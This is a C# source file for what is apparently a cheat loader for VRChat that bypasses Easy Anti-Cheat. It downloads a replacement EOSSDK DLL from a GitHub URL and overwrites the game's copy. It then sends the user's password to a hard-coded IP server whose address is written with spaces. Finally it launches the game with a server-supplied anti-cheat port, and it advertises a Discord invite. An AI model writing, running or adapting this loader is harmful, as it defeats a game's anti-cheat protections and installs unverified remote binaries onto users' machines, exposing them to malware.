using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;

namespace Cheat
{
    public static class Loader
    {
        private static string PathGame;
        private static string Password;

        [STAThread]
        public static async Task Main(string[] args)
        {
            string? pass = ParseGamePasswordArgument(args);
            if (string.IsNullOrEmpty(pass))
            {
                Console.Write("Password: ");
                pass = Console.ReadLine();
                if (string.IsNullOrEmpty(pass))
                    return;
            }

            string? folder = ParseGamePathArgument(args);
            if (string.IsNullOrEmpty(folder))
            {
                folder = await PickFolderAsync("Select the VRChat installation folder");
                if (string.IsNullOrEmpty(folder))
                    return;
            }

            PathGame = folder;
            Password = pass;
            Console.WriteLine($"Game path set to: {PathGame}");

            try
            {
                await StartBypassAsync();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Fatal error: {ex.Message}");
            }
            finally
            {
                Exit("discord.gg/8MvQgfnfvJ");
            }
        }

        private static string? ParseGamePathArgument(string[] args)
        {
            for (int i = 0; i < args.Length; i++)
            {
                if (args[i].StartsWith("--gamepath=", StringComparison.OrdinalIgnoreCase))
                    return args[i].Substring("--gamepath=".Length).Trim('"');

                if (args[i].Equals("--gamepath", StringComparison.OrdinalIgnoreCase) && i + 1 < args.Length)
                    return args[++i].Trim('"');
            }
            return null;
        }

        private static string? ParseGamePasswordArgument(string[] args)
        {
            for (int i = 0; i < args.Length; i++)
            {
                if (args[i].StartsWith("--password=", StringComparison.OrdinalIgnoreCase))
                    return args[i].Substring("--password=".Length).Trim('"');

                if (args[i].Equals("--password", StringComparison.OrdinalIgnoreCase) && i + 1 < args.Length)
                    return args[++i].Trim('"');
            }
            return null;
        }

        public static void Exit(string name)
        {
            Console.WriteLine($"Loader go closed. Grund: {name}");
            Environment.Exit(0);
        }

        public static Task<string?> PickFolderAsync(string title = "Select a folder")
        {
            return Task.Run(() =>
            {
                string? result = null;
                var thread = new Thread(() =>
                {
                    try
                    {
                        using var dialog = new FolderBrowserDialog
                        {
                            Description = title,
                            ShowNewFolderButton = false,
                            UseDescriptionForTitle = true
                        };
                        if (dialog.ShowDialog() == DialogResult.OK)
                            result = dialog.SelectedPath;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"FolderBrowserDialog error: {ex.Message}");
                    }
                });
                thread.SetApartmentState(ApartmentState.STA);
                thread.Start();
                thread.Join();
                return result;
            });
        }

        public static async Task StartBypassAsync()
        {
            if (string.IsNullOrWhiteSpace(PathGame))
                Exit("Game path is empty.");

            await Task.Delay(100);

            string exePath = Path.Combine(PathGame, "VRChat.exe");
            if (!File.Exists(exePath))
                Exit($"VRChat.exe not found in '{PathGame}'.");

            await Task.Delay(100);

            string destination = Path.Combine(PathGame, "VRChat_Data", "Plugins", "x86_64", "EOSSDK-Win64-Shipping.dll");
            string downloadUrl = "https://github.com/HallofFameClient/BepInResource/raw/refs/heads/main/EOSSDK-Win64-Shipping.dll";

            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(destination)!);
                using var httpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(30) };
                byte[] buffer = await httpClient.GetByteArrayAsync(downloadUrl);
                await File.WriteAllBytesAsync(destination, buffer);
                Console.WriteLine("DLL successfully downloaded and replaced.");
            }
            catch (Exception ex)
            {
                Exit($"Download failed: {ex.Message}");
            }

            await Task.Delay(3500);
            await StartVRChatProcessAsync(exePath);
        }

        private static async Task StartVRChatProcessAsync(string exePath)
        {
            var result = await Custom.GetPort();
            if (!result.Success)
            {
                MessageBox.Show($"Server Error: {result.PortOrError}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string port = result.PortOrError;
            bool hasVrMonitor = Process.GetProcessesByName("vrmonitor").Any();
            string vrFlag = hasVrMonitor ? "" : "--no-vr";

            string arguments = $"--no-vr -eac_port={port}".Trim();
            var startInfo = new ProcessStartInfo(exePath, arguments)
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                WorkingDirectory = Path.GetDirectoryName(exePath)
            };

            Process? vrchatProcess = null;
            try
            {
                vrchatProcess = Process.Start(startInfo);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to start VRChat: {ex.Message}", ex);
            }
        }

        public static class Custom
        {
            private static readonly HttpClient _Http = new HttpClient { Timeout = TimeSpan.FromSeconds(60) };
            private static readonly string ServerUrl = "h t t p: //45 .11. 228.204:8 0 8 0";

            public static async Task<(bool Success, string PortOrError)> GetPort()
            {
                string apiUrl = $"{ServerUrl}/?auth={Uri.EscapeDataString(Password)}";
                try
                {
                    string response = await _Http.GetStringAsync(apiUrl);
                    if (response.StartsWith("error|"))
                        return (false, response.Substring(6));
                    return (true, response);
                }
                catch (Exception ex)
                {
                    return (false, ex.Message);
                }
            }
        }
    }

    public static class CryptoHelper
    {
        private static readonly byte[] _key = Convert.FromBase64String("mJlvsRUAUQAQb4/JmyNY9PWs8lphaJQoLJWCHN50Jbs=");

        public static string EncryptTimestampArgument(string plainText, string key)
        {
            using var aes = Aes.Create();
            aes.Key = Encoding.UTF8.GetBytes(key);
            aes.GenerateIV();
            byte[] iv = aes.IV;

            byte[] cipherText;
            using (var ms = new MemoryStream())
            using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
            using (var sw = new StreamWriter(cs))
            {
                sw.Write(plainText);
                sw.Flush();
                cs.FlushFinalBlock();
                cipherText = ms.ToArray();
            }

            byte[] fullCipher = new byte[iv.Length + cipherText.Length];
            Buffer.BlockCopy(iv, 0, fullCipher, 0, iv.Length);
            Buffer.BlockCopy(cipherText, 0, fullCipher, iv.Length, cipherText.Length);
            return Convert.ToBase64String(fullCipher);
        }

        public static string EncryptAndSign(string plainText)
        {
            using var aes = Aes.Create();
            aes.Key = _key;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.GenerateIV();

            byte[] iv = aes.IV;
            byte[] plainBytes = Encoding.UTF8.GetBytes(plainText);

            using var encryptor = aes.CreateEncryptor();
            byte[] cipher = encryptor.TransformFinalBlock(plainBytes, 0, plainBytes.Length);

            using var hmac = new HMACSHA256(_key);
            byte[] combinedForHmac = new byte[iv.Length + cipher.Length];
            Buffer.BlockCopy(iv, 0, combinedForHmac, 0, iv.Length);
            Buffer.BlockCopy(cipher, 0, combinedForHmac, iv.Length, cipher.Length);
            byte[] hmacBytes = hmac.ComputeHash(combinedForHmac);

            byte[] result = new byte[iv.Length + cipher.Length + hmacBytes.Length];
            Buffer.BlockCopy(iv, 0, result, 0, iv.Length);
            Buffer.BlockCopy(cipher, 0, result, iv.Length, cipher.Length);
            Buffer.BlockCopy(hmacBytes, 0, result, iv.Length + cipher.Length, hmacBytes.Length);
            return Convert.ToBase64String(result);
        }
    }
}
